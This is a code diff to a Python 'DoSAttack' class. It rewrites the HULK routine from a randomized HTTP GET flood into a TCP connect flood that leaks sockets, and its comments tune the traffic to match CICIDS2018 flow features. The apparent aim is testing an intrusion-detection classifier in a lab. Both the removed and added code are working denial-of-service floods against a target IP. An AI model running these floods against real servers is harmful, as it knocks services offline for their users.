@@ -134,44 +134,45 @@ class DoSAttack:
                 self.last_error = err_msg
 
     # ──────────────────────────────────────────────────────
-    # HULK — HTTP GET flood (connect, send GET, abandon socket)
+    # HULK — TCP connect flood (connect + abandon socket)
     #
     # CICIDS2018 HULK training data (n=461K, Fri-16-02-2018):
-    #   Tot Fwd Pkts:       median=3 (SYN + ACK + GET)
-    #   TotLen Fwd Pkts:    median=313 (HTTP GET payload size)
-    #   Tot Bwd Pkts:       median=4 (SYN-ACK + ACK + response + FIN)
-    #   Init Fwd Win Byts:  bimodal 75%=225, 25%=26883
-    #   Init Bwd Win Byts:  219 (Ubuntu 16.04)
-    #   RST Flag Cnt:       0 (sockets abandoned, no explicit close)
-    #   SYN Flag Cnt:       0 (Java CICFlowMeter flag counting)
-    #   Flow Duration:      median=1147 µs (~1.1ms — fast LAN!)
-    #   Fwd Seg Size Min:   32 (TCP with timestamp options)
-    #   Fwd Pkt Len Mean:   ~104 (313 payload / 3 fwd pkts)
-    #   Bwd Pkt Len Max:    ~935 (HTTP response max segment)
-    #   Flow Byts/s:        ~724K (high throughput, short duration)
+    #   Tot Fwd Pkts:       mode=2 (81.1%) — SYN counted twice
+    #                       (Java CICFlowMeter first-packet duplication)
+    #   Tot Bwd Pkts:       mode=0 (94.5%) — no backward packets
+    #   TotLen Fwd Pkts:    mode=0 — SYN has zero payload
+    #   Init Fwd Win Byts:  225 (96.7%) — attacker SO_RCVBUF
+    #   Init Bwd Win Byts:  -1 (94.5%) — Java default (never set)
+    #   RST Flag Cnt:       0 (100%) — sockets abandoned
+    #   SYN Flag Cnt:       0 (100%) — Java flag counting behavior
+    #   ACK Flag Cnt:       1 (96.7%)
+    #   PSH Flag Cnt:       0 (96.9%) — no data sent
+    #   Flow Duration:      very short (µs range)
+    #   Fwd Seg Size Min:   32 (99.7%) — TCP with timestamps
     #   Dst Port: 80
     #
-    # APPROACH: Connect → Send HTTP GET → Let server respond →
-    #   ABANDON the socket (no close, no recv). The server
-    #   responds with SYN-ACK, ACK, HTTP 404, FIN. All packets
-    #   are captured by CICFlowMeter. After 15s idle the flow
-    #   is exported with RST=0, matching training exactly.
+    # APPROACH: TCP connect() → ABANDON (no send, no recv, no close).
+    #   The 3-way handshake (SYN, SYN-ACK, ACK) is captured by
+    #   CICFlowMeter. With first-packet duplication, SYN is counted
+    #   twice → Tot Fwd Pkts=2 (matching training). Socket is leaked
+    #   to prevent RST. After idle timeout the flow is exported.
     # ──────────────────────────────────────────────────────
     def hulk_attack(self):
-        """HULK DoS: HTTP GET flood with socket leak.
+        """HULK DoS: TCP connect flood with socket leak.
 
         Each iteration:
-          1. TCP connect (SYN, SYN-ACK, ACK)
-          2. Send randomized HTTP GET request (~300 bytes payload)
-          3. Do NOT recv() or close() — abandon the socket
-          4. Server responds (ACK, HTTP response, FIN) → captured by CICFlowMeter
-          5. Socket held in pool → cleaned after classification stops
+          1. TCP connect (SYN → SYN-ACK → ACK)
+          2. Do NOT send, recv, or close — abandon the socket
+          3. Socket held in pool → cleaned after classification stops
 
-        This produces flows matching CICIDS2018 HULK training data:
-          Tot Fwd Pkts=3, Tot Bwd Pkts=3-4, TotLen Fwd Pkts=~300,
-          Bwd Pkt Len Max=~500-900, RST Flag Cnt=0, Duration=~1-2ms
+        CICFlowMeter captures the handshake packets and produces:
+          Tot Fwd Pkts=2-3, Tot Bwd Pkts=0-1, TotLen Fwd Pkts=0,
+          RST Flag Cnt=0 (no close), Duration=very short
 
-        REQUIRES: Victim ip route window 219 for Init Bwd Win Byts match.
+        REQUIRES:
+          - ip route window 225 on attacker for Init Fwd Win Byts
+          - ip route window 219 on victim for Init Bwd Win Byts
+          - TCP timestamps enabled on attacker for Fwd Seg Size Min=32
         """
         end_time = time.time() + self.duration
 
@@ -205,33 +206,14 @@ class DoSAttack:
                     sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HULK_HIGH)
 
                 sock.connect((self.target_ip, self.target_port))
-
-                # ── Send randomized HTTP GET request (like real HULK) ──
-                # HULK sends GET with random URL params + random headers.
-                # Total request ~300 bytes (~313 training median).
-                path = f"/{_random_string(8)}{_random_url_params(3)}"
-                request = (
-                    f"GET {path} HTTP/1.1\r\n"
-                    f"Host: {self.target_ip}\r\n"
-                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                    f"Referer: {random.choice(REFERERS)}{_random_string(6)}\r\n"
-                    f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
-                    f"Accept-Encoding: {random.choice(ACCEPT_ENCODINGS)}\r\n"
-                    f"Connection: keep-alive\r\n"
-                    f"\r\n"
-                )
-                sock.sendall(request.encode())
                 self._inc_count()
 
-                # DON'T recv(), DON'T close() — abandon the socket.
-                # The server will:
-                #   1. ACK our GET data
-                #   2. Send HTTP response (404 in ~500 bytes)
-                #   3. Send FIN (HTTP/1.0 server closes after response)
-                # All these packets are captured by CICFlowMeter,
-                # producing: Tot Fwd Pkts=3, Tot Bwd Pkts=3-4,
-                # TotLen Fwd Pkts≈300, Bwd Pkt Len Max≈500+
-                # RST Flag Cnt=0 (no close from our side)
+                # DON'T send(), DON'T recv(), DON'T close() — just abandon.
+                # The TCP handshake (SYN, SYN-ACK, ACK) was already captured
+                # by CICFlowMeter. With first-packet duplication:
+                #   Tot Fwd Pkts = 2 (SYN×2) or 3 (SYN×2 + ACK)
+                #   TotLen Fwd Pkts = 0 (SYN has no payload)
+                #   RST Flag Cnt = 0 (socket not closed)
                 leaked.append(sock)
 
             except Exception as e:
